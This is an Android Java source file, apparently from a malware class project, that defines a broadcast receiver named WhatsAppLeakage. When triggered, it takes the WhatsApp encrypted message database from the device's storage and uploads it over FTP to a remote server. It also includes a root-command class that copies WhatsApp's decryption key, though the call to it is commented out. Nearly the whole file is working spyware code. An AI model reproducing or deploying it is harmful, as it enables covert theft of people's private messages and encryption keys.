package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;

public class WhatsAppLeakage extends BroadcastReceiver {

    private static final String TAG = "WHATSAPP";
    private static String cacheDirPath = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Started");
        File file = new File("/sdcard/WhatsApp/Databases/msgstore.db.crypt12");
        cacheDirPath = context.getCacheDir().getAbsolutePath();
        //new ExportCryptKey().getCommandsToExecute();
        //File key = new File(context.getCacheDir(), "key.txt");
        //File key2 = new File("/data/data/com.whatsapp/files/key");
        // upload key and database
        File[] files = new File[2];
        files[0] = file;
        //files[1] = key;

        new FTP(context).upload(files, "locations");

    }

    private class ExportCryptKey extends ExecuteAsRootBase{

        @Override
        protected ArrayList<String> getCommandsToExecute() {
            ArrayList<String> commands = new ArrayList<>();
            String command = "cp /data/data/com.whatsapp/files/key " + cacheDirPath + "/key.txt";
            commands.add(command);
            return commands;
        }
    }
}
